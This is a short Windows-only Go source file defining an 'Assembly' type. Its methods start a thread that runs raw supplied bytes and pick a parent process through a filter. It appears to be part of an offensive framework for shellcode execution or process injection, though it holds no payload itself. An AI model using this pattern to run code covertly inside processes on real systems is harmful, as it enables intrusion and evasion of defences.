//go:build windows

package cmd

import "github.com/iDigitalFlame/xmt/cmd/filter"

// Pid retruns the process ID of the owning process (the process running
// the thread.)
//
// This may return zero if the thread has not yet been started.
func (a *Assembly) Pid() uint32 {
	return a.t.Pid()
}

// Start will attempt to start the Assembly thread and will return any errors
// that occur while starting the thread.
//
// This function will return 'ErrEmptyCommand' if the 'Data' parameter is empty or
// the 'ErrAlreadyStarted' error if attempting to start a thread that already has
// been started previously.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func (a *Assembly) Start() error {
	if len(a.Data) == 0 {
		return ErrEmptyCommand
	}
	if err := a.t.Start(0, a.Timeout, 0, a.Data); err != nil {
		return err
	}
	go a.t.wait()
	return nil
}

// SetParent will instruct the Assembly thread to choose a parent with the supplied
// process Filter. If the Filter is nil this will use the current process (default).
//
// This function has no effect if the device is not running Windows.
func (a *Assembly) SetParent(f *filter.Filter) {
	a.t.filter = f
}
